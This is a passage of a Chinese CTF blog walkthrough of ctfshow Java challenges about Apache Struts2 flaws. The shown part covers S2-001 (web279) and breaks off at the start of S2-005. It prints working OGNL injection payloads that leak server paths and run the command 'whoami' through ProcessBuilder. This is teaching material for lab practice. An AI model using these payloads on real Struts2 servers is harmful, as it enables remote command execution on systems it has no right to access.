<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="ctfshow入门java">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow入门Java">
<meta property="og:url" content="https://wanth3f1ag.top/2026/02/17/ctfshow%E5%85%A5%E9%97%A8Java/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="ctfshow入门java">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218121524339.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218124932855.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218125026643.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218130413169.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218130144363.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218132339513.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260219192614313.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260219192655753.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260219193304057.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260223223713004.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260223224536076.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224111235115.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224112106048.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224112806685.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224113659371.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224115354721.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224120042326.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224121125356.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224123448604.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224123542662.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224124930826.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224124916384.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224125711178.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224125932153.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224132714440.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224133040484.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224141040278.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260224142017795.png">
<meta property="article:published_time" content="2026-02-17T04:04:55.000Z">
<meta property="article:modified_time" content="2026-02-24T06:21:55.134Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260218121524339.png">


<link rel="canonical" href="https://wanth3f1ag.top/2026/02/17/ctfshow%E5%85%A5%E9%97%A8Java/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/02/17/ctfshow%E5%85%A5%E9%97%A8Java/","path":"2026/02/17/ctfshow入门Java/","title":"ctfshow入门Java"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow入门Java | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web279"><span class="nav-number">1.</span> <span class="nav-text">web279</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-001"><span class="nav-number">1.1.</span> <span class="nav-text">#S2-001</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web280"><span class="nav-number">2.</span> <span class="nav-text">web280</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-005"><span class="nav-number">2.1.</span> <span class="nav-text">#S2-005</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-0-2-1-8-1"><span class="nav-number">2.3.</span> <span class="nav-text">2.0.0 - 2.1.8.1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web281"><span class="nav-number">3.</span> <span class="nav-text">web281</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-007"><span class="nav-number">3.1.</span> <span class="nav-text">#S2-007</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">3.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-0-2-2-3"><span class="nav-number">3.3.</span> <span class="nav-text">2.0.0 - 2.2.3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web282"><span class="nav-number">4.</span> <span class="nav-text">web282</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-008"><span class="nav-number">4.1.</span> <span class="nav-text">#S2-008</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="nav-number">4.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-0-2-3-1"><span class="nav-number">4.3.</span> <span class="nav-text">2.1.0 - 2.3.1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web283"><span class="nav-number">5.</span> <span class="nav-text">web283</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-009"><span class="nav-number">5.1.</span> <span class="nav-text">#S2-009</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-4"><span class="nav-number">5.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-0-2-3-1-1"><span class="nav-number">5.3.</span> <span class="nav-text">2.1.0 - 2.3.1.1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web284"><span class="nav-number">6.</span> <span class="nav-text">web284</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-012"><span class="nav-number">6.1.</span> <span class="nav-text">#S2-012</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-5"><span class="nav-number">6.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web285"><span class="nav-number">7.</span> <span class="nav-text">web285</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-013"><span class="nav-number">7.1.</span> <span class="nav-text">#S2-013</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-6"><span class="nav-number">7.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web286"><span class="nav-number">8.</span> <span class="nav-text">web286</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-015"><span class="nav-number">8.1.</span> <span class="nav-text">#S2-015</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-7"><span class="nav-number">8.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web287"><span class="nav-number">9.</span> <span class="nav-text">web287</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-016"><span class="nav-number">9.1.</span> <span class="nav-text">#S2-016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-8"><span class="nav-number">9.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web288"><span class="nav-number">10.</span> <span class="nav-text">web288</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-019"><span class="nav-number">10.1.</span> <span class="nav-text">#S2-019</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web289"><span class="nav-number">11.</span> <span class="nav-text">web289</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-029%EF%BC%9F"><span class="nav-number">11.1.</span> <span class="nav-text">#S2-029？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web290"><span class="nav-number">12.</span> <span class="nav-text">web290</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-032"><span class="nav-number">12.1.</span> <span class="nav-text">#S2-032</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-9"><span class="nav-number">12.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web291"><span class="nav-number">13.</span> <span class="nav-text">web291</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-037"><span class="nav-number">13.1.</span> <span class="nav-text">#S2-037</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%89"><span class="nav-number">13.2.</span> <span class="nav-text">影响版本（不确定）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web292"><span class="nav-number">14.</span> <span class="nav-text">web292</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-037-1"><span class="nav-number">14.1.</span> <span class="nav-text">#S2-037</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-10"><span class="nav-number">14.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web293"><span class="nav-number">15.</span> <span class="nav-text">web293</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-045"><span class="nav-number">15.1.</span> <span class="nav-text">#S2-045</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-11"><span class="nav-number">15.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web294"><span class="nav-number">16.</span> <span class="nav-text">web294</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-046"><span class="nav-number">16.1.</span> <span class="nav-text">#S2-046</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-12"><span class="nav-number">16.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web295"><span class="nav-number">17.</span> <span class="nav-text">web295</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-048"><span class="nav-number">17.1.</span> <span class="nav-text">#S2-048</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-13"><span class="nav-number">17.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web296"><span class="nav-number">18.</span> <span class="nav-text">web296</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-052"><span class="nav-number">18.1.</span> <span class="nav-text">#S2-052</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-14"><span class="nav-number">18.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web297"><span class="nav-number">19.</span> <span class="nav-text">web297</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-053"><span class="nav-number">19.1.</span> <span class="nav-text">#S2-053</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-15"><span class="nav-number">19.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web298"><span class="nav-number">20.</span> <span class="nav-text">web298</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E5%9F%BA%E7%A1%80"><span class="nav-number">20.1.</span> <span class="nav-text">#Java基础</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web299"><span class="nav-number">21.</span> <span class="nav-text">web299</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">21.1.</span> <span class="nav-text">#任意文件读取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web300"><span class="nav-number">22.</span> <span class="nav-text">web300</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">22.1.</span> <span class="nav-text">#php+java任意文件读取</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">183</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">121</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/02/17/ctfshow%E5%85%A5%E9%97%A8Java/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow入门Java | root@wanth3f1ag">
      <meta itemprop="description" content="ctfshow入门java">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow入门Java
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2026-02-17 12:04:55" itemprop="dateCreated datePublished" datetime="2026-02-17T12:04:55+08:00">2026-02-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2026-02-24 14:21:55" itemprop="dateModified" datetime="2026-02-24T14:21:55+08:00">2026-02-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>35k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>32 分钟</span>
    </span>
</div>

            <div class="post-description">ctfshow入门java</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="#S2-001"></a>#S2-001</h2><p>在页面源代码找到一个<code>/S2-001/</code>的路由，我记得有一个老漏洞就是struts2的S2-001</p>
<p>找个文章 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/224041.html">https://www.freebuf.com/articles/network/224041.html</a></p>
<p>S2-001是因为Struts2中允许用户提交包含OGNL表达式字符串的表单数据，当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值<code>%&#123;value&#125;</code>并重新填充相应的表单数据。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.0.8</p>
<p>获取tomcat路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>获取web路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>关于OGNL表达式注入的话可以看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17788847.html">https://www.cnblogs.com/LittleHann/p/17788847.html</a></p>
<p>传入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>/%&#123;<span class="number">1</span>+<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<p>发现1+1被执行并填充到表单中</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218121524339.png" alt="image-20260218121524339"></p>
<p>然后打poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>页面返回root，可以执行命令直接打就行了，最后flag是在env环境变量里面</p>
<h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><h2 id="S2-005"><a href="#S2-005" class="headerlink" title="#S2-005"></a>#S2-005</h2><p>S2-005漏洞</p>
<p>找到参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/41626959">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/193078.html">https://www.freebuf.com/vuls/193078.html</a></p>
